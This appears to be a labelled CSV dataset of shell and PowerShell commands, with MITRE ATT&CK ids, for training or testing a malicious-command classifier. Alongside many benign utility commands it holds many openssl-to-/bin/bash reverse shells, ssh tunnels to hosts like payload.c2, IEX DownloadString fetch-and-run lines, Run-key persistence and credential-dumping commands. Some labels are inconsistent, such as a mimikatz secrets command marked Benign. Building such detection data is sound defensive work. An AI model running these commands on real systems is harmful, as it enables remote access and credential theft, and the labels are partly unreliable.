command,label,original_label,mitre_id
"& ""PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"" purge",Malicious,Malicious,T1550
ssh -R 8080:localhost:8080 postgres@corp-backup.internal,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:443,Malicious,Synthetic,Synthetic
tune.exfat [-I|--set-serial] new_serial /dev/sdXY,Benign,Benign,Benign
"find / \( -perm -4000 -fprintf /root/suid.txt '%#m %u %p\n' \) , ( -size +100M -fprintf /root/big.txt '%-10s %p\n' \)",Context_Dependent,Benign,Benign
ssh -R 4444:localhost:995 user@172.16.0.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:5432 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
"xml [esc|escape] ""<a1>""",Benign,Benign,Benign
setxkbmap fr,Benign,Benign,Benign
"find ! -newermt ""apr 01 2007"" -newermt ""mar 01 2007"" -ls",Benign,Benign,Benign
flips,Benign,Benign,Benign
ssh -R 4444:localhost:3389 support@192.168.0.5,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:1433,Malicious,Synthetic,Synthetic
Remove-Variable xlApp,Malicious,Malicious,T1204
ssh -R 8080:localhost:80 support@10.0.0.25,Context_Dependent,Synthetic,Synthetic
ssh -R 8080:localhost:80 audit@target.com,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:5432 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
prowler aws [-s|--services] s3|ec2|...,Benign,Benign,Benign
ssh -R 4444:localhost:443 svcuser@192.168.1.1,Context_Dependent,Synthetic,Synthetic
"find ./js/ -type f -name ""*.js"" | xargs rm -f",Benign,Benign,Benign
pnpx module_name,Benign,Benign,Benign
"echo ""import os; os.system('date > /tmp/poc.txt')"" > ""$USER_PACKAGES/usercustomize.py""",Malicious,Malicious,T1546
xcodebuild -showsdks,Benign,Benign,Benign
dex [-c|--create] path/to/file.desktop,Benign,Benign,Benign
"wrk [-t|--threads] 12 [-c|--connections] 400 [-d|--duration] 30s ""http://127.0.0.1:8080/index.html""",Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:1433 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
wget2 https://example.com/resource,Benign,Benign,Benign
"koji call build '""git+https://src.fedoraproject.org/rpms/vim.git#e847a50297a216229050bf4db3d06a139104e7cf""' \""target\"" --kwargs '{""opts"":{""arch_override"":""sw_64""}}'",Benign,Benign,Benign
lstopo,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:6379,Malicious,Synthetic,Synthetic
"cd ""`xsel`""",Benign,Benign,Benign
find /tmp/ -ctime -1 -name 'x*' -print0 | xargs -r0 mv -t ~/play/,Benign,Benign,Benign
InvocationMethod = '$invocation_method',Malicious,Malicious,T1218
tlmgr check executes,Benign,Benign,Benign
serve [-s|--single],Benign,Benign,Benign
envycontrol --dm gdm|gdm3|sddm|lightdm,Benign,Benign,Benign
cli53 [rc|rrcreate] --replace 'www 300 A 150.130.110.2',Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:53,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:3306 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4444,Malicious,Synthetic,Synthetic
sudo setfiles /etc/selinux/targeted/contexts/files/file_contexts path/to/directory [-v|--verbose],Benign,Benign,Benign
ssh -L 8080:localhost:80 root@target.com,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
find . -perm -a+r -perm /a+w ! -perm /a+x,Benign,Benign,Benign
findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE:.exe},Malicious,Malicious,T1105
rabbitmqctl cluster_status,Benign,Benign,Benign
doctum update,Benign,Benign,Benign
ssh -R 8080:localhost:6379 user@192.168.1.10,Context_Dependent,Synthetic,Synthetic
hg commit [-m|--message] message,Benign,Benign,Benign
calibre-server,Benign,Benign,Benign
GetModuleFileName,Malicious,Malicious,T1106
openssl s_client -quiet -connect 10.10.10.25:1433 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
"find . -name ""string to be searched"" -exec grep ""text"" ""{}"" \;",Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:53 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
cat files.txt | xargs du -c | tail -1 | awk '{print $1}',Benign,Benign,Benign
yek path/to/directory --max-size 100KB --output-name yek-output.txt,Benign,Benign,Benign
SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows,Malicious,Malicious,T1546
zeroclaw cron list,Benign,Benign,Benign
atoum --init,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8080,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9090,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:3306 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4444,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8443,Malicious,Synthetic,Synthetic
rabbitmq-diagnostics log_tail --number n --node node,Benign,Benign,Benign
find sourceDir -mindepth 1 -print0 | xargs -0 mv --target-directory=destDir,Benign,Benign,Benign
getent shadow,Malicious,Malicious,T1548
Restart-Computer,Malicious,Malicious,T1547
find . -type f -wholename \*.mbox -print0 | \ while read I ; do mv $I $(echo $I | sed 's/\.mbox//') ; done ;,Benign,Benign,Benign
PostMessage,Malicious,Malicious,T1055
ssh -R 4444:localhost:143 admin@example.com,Context_Dependent,Synthetic,Synthetic
jhead -ft path/to/image.jpg,Benign,Benign,Benign
alr build --release|--development|--validation,Benign,Benign,Benign
cat whatever | egrep 'snozzberries|$',Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:9090 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
find / -type d -name root,Context_Dependent,Benign,Benign
cabal build,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:4444 jenkins@corp-backup.internal,Context_Dependent,Synthetic,Synthetic
fsadm [-n|--dry-run] resize /dev/vg_name/lv_name 10G,Benign,Benign,Benign
flutterfire configure --project project_id,Benign,Benign,Benign
ascii -o,Benign,Benign,Benign
ssh -R 8080:localhost:3389 audit@172.16.0.10,Context_Dependent,Synthetic,Synthetic
ssh -R 4444:localhost:22 support@10.0.0.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:995,Malicious,Synthetic,Synthetic
fls -r -m C: -o sector path/to/image_file,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:22,Malicious,Synthetic,Synthetic
lpass status,Benign,Benign,Benign
mssync.exe,Malicious,Malicious,T1036
ssh -L 8080:localhost:993 operator@payload.c2,Context_Dependent,Synthetic,Synthetic
xwininfo -tree -root | grep keyword | head -1 | perl -ne 'print $1 if /(0x[\da-f]+)/ig;',Benign,Benign,Benign
restorecon -R -T 0 -p path/to/directory,Benign,Benign,Benign
"find /home/u20806/public_html -maxdepth 1 -mmin +5 -type f -name ""*.txt"" ! -name ""robots.txt"" -delete",Context_Dependent,Benign,Benign
base64 [-w|--wrap] 0|76|... path/to/file,Benign,Benign,Benign
"xonsh -c ""command""",Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:22 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:443,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:9001 user@192.168.1.1,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:5432 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
mk -k,Benign,Benign,Benign
wmic shadowcopy call create Volume=$drive_letter,Malicious,Malicious,T1003
"cal | awk 'NR>2{Sfields=7-NF; if (Sfields == 0 ) {printf ""%02d\n"",$3;exit}}'",Benign,Benign,Benign
ssh -L 8080:localhost:8888 operator@172.16.0.25,Context_Dependent,Synthetic,Synthetic
ipcrm [-q|--queue-id] ipc_queue_id,Benign,Benign,Benign
sort <(ls one) <(ls two) | uniq -d,Benign,Benign,Benign
gpasswd [-d|--delete] user group,Benign,Benign,Benign
nextflow run workflow -work-dir path/to/directory -with-report report.html,Benign,Benign,Benign
dolt version,Benign,Benign,Benign
pnpm [rm|remove] module_name,Benign,Benign,Benign
if ($LASTEXITCODE -eq 0) {,Malicious,Malicious,T1528
"git guilt 'git log --until ""3 weeks ago"" --format ""%H"" [-n|--max-count] 1'",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:443,Malicious,Synthetic,Synthetic
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1'),Context_Dependent,Malicious,T1082
bun pm hash-print,Benign,Benign,Benign
terragrunt apply,Benign,Benign,Benign
Exec,Malicious,Malicious,T1547
openssl s_client -quiet -connect 172.16.0.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:445,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:9090 user@10.10.10.50,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:6379 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
mv /mnt/usbdisk/[^l]* /home/user/stuff/.,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:5432 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
dpkg [-S|--search] path/to/file,Benign,Benign,Benign
pbmclean path/to/image.pbm > path/to/output.pbm,Benign,Benign,Benign
herd start,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:53,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:22 root@172.16.0.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4444,Malicious,Synthetic,Synthetic
df -aH,Context_Dependent,Malicious,T1135
systemd-tmpfiles --create,Benign,Benign,Benign
KerberosRequestorSecurityToken.GetRequest,Malicious,Malicious,T1558
openssl s_client -quiet -connect 172.16.0.10:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9090,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9001,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:80 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
echo Aa | od -t x1,Benign,Benign,Benign
tarsnap -c --keyfile path/to/key_file --cachedir path/to/cache_directory -f archive_name path/to/file_or_directory1 path/to/file_or_directory2 ...,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
surge list,Benign,Benign,Benign
gio trash trash://id,Benign,Benign,Benign
phan --output-mode text|verbose|json|csv|codeclimate|checkstyle|pylint|html,Benign,Benign,Benign
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\jsestartup.jse"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse""",Malicious,Malicious,T1547
audacious,Benign,Benign,Benign
git worktree move path/to/worktree new/path,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:3306,Malicious,Synthetic,Synthetic
sudo steamos-update check,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:1433 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
find . -path '*/lang/en.css' -prune -o -name '*.css' -print,Benign,Benign,Benign
pw-dump [-r|--remote] remote_name > path/to/dump_file.json,Benign,Benign,Benign
find / -perm -644,Context_Dependent,Benign,Benign
reflector [-h|--help],Benign,Benign,Benign
gcov [-a|--all-blocks] path/to/file.cpp,Benign,Benign,Benign
ssh -L 8080:localhost:993 backup@172.16.5.20,Context_Dependent,Synthetic,Synthetic
tldr [-p|--platform] linux tftp,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.25:8443,Malicious,Synthetic,Synthetic
sudo lastb,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:443 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
deepseek --local,Benign,Benign,Benign
cp /path/to/dir/path/to/input-file /path/to/output-file,Malicious,Malicious,T1105
echo DATA | openssl enc -out /path/to/output-file,Malicious,Malicious,T1222
adig -d example.com,Benign,Benign,Benign
ssh -R 4444:localhost:5432 support@ops-audit.internal,Context_Dependent,Synthetic,Synthetic
git show-ref [-s|--hash] | git commit-graph write --stdin-commits,Benign,Benign,Benign
lp path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8080,Malicious,Synthetic,Synthetic
w32tm /query /peers,Benign,Benign,Benign
"'@ -OutputAssembly ""$executable_filepath""",Malicious,Malicious,T1036
ln -nsf alpha_2 alpha,Benign,Benign,Benign
kubectl top [po|pods],Context_Dependent,Benign,Benign
mkinitcpio [-L|--listhooks],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:9090 operator@10.0.0.5,Context_Dependent,Synthetic,Synthetic
"find /path -type d -exec chmod 0755 ""{}"" \;",Benign,Benign,Benign
kitex path/to/IDL_file.thrift,Benign,Benign,Benign
ssh -R 4444:localhost:9090 audit@payload.c2,Context_Dependent,Synthetic,Synthetic
zabbix_agent2 [-c|--config] path/to/zabbix_agent2.conf [-T|--test-config],Benign,Benign,Benign
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\svchost : %APPDATA%\Microsoft\Network\svchost.exe,Malicious,Malicious,T1547
touch $target_file_path,Malicious,Malicious,T1070
adscript --executable --output path/to/file path/to/input_file.adscript,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:8888 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:3389 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:8443 deploy@192.168.1.100,Context_Dependent,Synthetic,Synthetic
"echo ""# Required-Start: \$all"" >> /etc/init.d/T1543.002",Malicious,Malicious,T1543
picotool load path/to/binary,Benign,Benign,Benign
cmd-wrapped,Benign,Benign,Benign
file */* *>> $output_file,Context_Dependent,Malicious,T1083
ssh -R 4444:localhost:22 svcuser@10.20.30.40,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8443,Malicious,Synthetic,Synthetic
tldr zed,Benign,Benign,Benign
pyats subcommand,Benign,Benign,Benign
GetKeyboardLayoutList,Context_Dependent,Malicious,T1614
openssl s_client -quiet -connect 192.168.0.5:3306 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
zgrep [-E|--extended-regexp] regex path/to/file,Benign,Benign,Benign
Compress-Archive -Path path\to\file -DestinationPath path\to\directory.zip -Update,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:6379,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
ppmtobmp -windows|os2 path/to/file.ppm > path/to/file.bmp,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:3306 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:53 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4444,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:80 postgres@update.bad,Context_Dependent,Synthetic,Synthetic
lsmem [-b|--bytes],Benign,Benign,Benign
sudo quotacheck --debug mountpoint,Benign,Benign,Benign
"nhentai --cookie ""csrftoken=TOKEN; sessionid=ID""",Benign,Benign,Benign
sudo setfiles /etc/selinux/targeted/contexts/files/file_contexts path/to/new_directory [-r|--rootpath] path/to/old_directory,Benign,Benign,Benign
mkdocs gh-deploy,Benign,Benign,Benign
"whence -c ""command""",Benign,Benign,Benign
acyclic path/to/input.gv > path/to/output.gv,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
pinky user -lh,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:443,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:53 audit@assets-dropper.net,Context_Dependent,Synthetic,Synthetic
find * -prune -type f -size +0c -print,Benign,Benign,Benign
php-coveralls [-o|--json_path] path/to/coveralls-upload.json,Benign,Benign,Benign
"compress-archive -path ""$exfil_folder"" -destinationpath ""$exfil_folder.zip"" -force",Malicious,Malicious,T1555
pngquant --quality 0-100 path/to/file.png,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:22,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:3306,Malicious,Synthetic,Synthetic
git rebase-patch patch_file,Benign,Benign,Benign
singularity pull --name image.sif library://godlovedc/funny/lolcow:latest,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4444,Malicious,Synthetic,Synthetic
"nl -b a file | sort -k1,1nr | sed '1, 4 d' | sort -k1,1n | sed 's/^ *[0-9]*\t//'",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:3389 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:110,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
mongoexport --collection=collection_name --jsonArray,Benign,Benign,Benign
jmtpfs [-l|--listDevices],Benign,Benign,Benign
ssh -L 8080:localhost:80 postgres@192.168.0.5,Context_Dependent,Synthetic,Synthetic
hugo server [-p|--port] port_number,Benign,Benign,Benign
dscl . list /Groups,Context_Dependent,Malicious,T1087
openssl s_client -quiet -connect 192.168.0.5:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:143,Malicious,Synthetic,Synthetic
bpkg update,Benign,Benign,Benign
ssh -R 8080:localhost:110 user@10.0.0.5,Context_Dependent,Synthetic,Synthetic
patchwork -T svg -o path/to/image.svg path/to/input.gv,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8443,Malicious,Synthetic,Synthetic
sudo lxc-create [-P|--lxcpath] /path/to/directory/ [-n|--name] container_name [-t|--template] download,Benign,Benign,Benign
sshd -D -d,Benign,Benign,Benign
doxx path/to/file.docx [-s|--search] pattern,Benign,Benign,Benign
ssh -L 8080:localhost:995 user@10.10.10.50,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:5432,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:443 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
minikube start --background,Benign,Benign,Benign
ssh -L 8080:localhost:8080 admin@172.16.5.20,Context_Dependent,Synthetic,Synthetic
calc -m mode,Benign,Benign,Benign
satis add repository_url,Benign,Benign,Benign
find . ! -user root,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
"set-itemproperty $RunOnceKey ""NextRun"" '$thing_to_execute ""IEX (New-Object Net.WebClient).DownloadString(`""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`"")""'",Malicious,Malicious,T1547
sudo eclean [-d|--deep] [-n|--package-names] distfiles,Benign,Benign,Benign
ssh -R 4444:localhost:9090 user@172.16.0.25,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:8888 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
findfs LABEL=label,Benign,Benign,Benign
aurman [-S|--sync] [-s|--search] keyword,Benign,Benign,Benign
ssh -R 4444:localhost:80 svcuser@10.0.0.1,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:1433 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
watch -n 1 date,Benign,Benign,Benign
vale path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:3306,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:445,Malicious,Synthetic,Synthetic
pygbag path/to/project_folder --port 8080,Benign,Benign,Benign
python3 vol.py [-f|--filename] path\to\memory_dump_file windows.info,Benign,Benign,Benign
salt-call state.highstate test=true,Benign,Benign,Benign
ollama create new_model_name [-f|--file] path/to/Modelfile,Benign,Benign,Benign
lolcat [-a|--animate] path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:53 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
"alias unix=""date +%s""",Benign,Benign,Benign
chronic command option1 option2 ...,Benign,Benign,Benign
namei [-o|--owners] path/to/a path/to/b path/to/c,Benign,Benign,Benign
valgrind --tool=massif --stacks=yes program,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:22 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
babeld -D,Benign,Benign,Benign
openconnect --config=path/to/file vpn.example.org,Benign,Benign,Benign
deluge [-l|--logfile] path/to/log_file url|magnet|path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:6379 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:80 support@10.0.0.100,Context_Dependent,Synthetic,Synthetic
ssh -R 8080:localhost:8888 user@192.168.1.25,Context_Dependent,Synthetic,Synthetic
sslstrip --listen=8080,Benign,Benign,Benign
mise install name@version,Benign,Benign,Benign
$AuthenticationPackagesValues += $passwordFilterName,Malicious,Malicious,T1556
task list,Benign,Benign,Benign
ssh -R 4444:localhost:22 admin@example.com,Context_Dependent,Synthetic,Synthetic
bzip2 [-dc|--decompress --stdout] path/to/compressed_file.bz2,Benign,Benign,Benign
raku -M module_name path/to/script.raku,Benign,Benign,Benign
"grep -v ""pattern"" filename > filename2; mv filename2 filename",Benign,Benign,Benign
tldr docker container cp,Benign,Benign,Benign
cotton -u base_url path/to/file.md,Benign,Benign,Benign
yay -Ss keyword,Benign,Benign,Benign
gzip -d file.gz,Benign,Benign,Benign
tldr pamoil,Benign,Benign,Benign
backlight_control,Benign,Benign,Benign
"mimikatz ""sekurlsa::secrets""",Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:110 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
"influx -username username -password """"",Benign,Benign,Benign
ssh -R 4444:localhost:993 root@192.168.1.254,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
browser-sync init,Benign,Benign,Benign
"cd ""$env:PathToAtomicsFolder\T1555.003\bin""",Malicious,Malicious,T1555
"Remove-Item -Recurse path\to\key1 , path\to\key2 ...",Benign,Benign,Benign
git shortlog [-s|--summary] [-n|--numbered] [-e|--email],Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:995 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
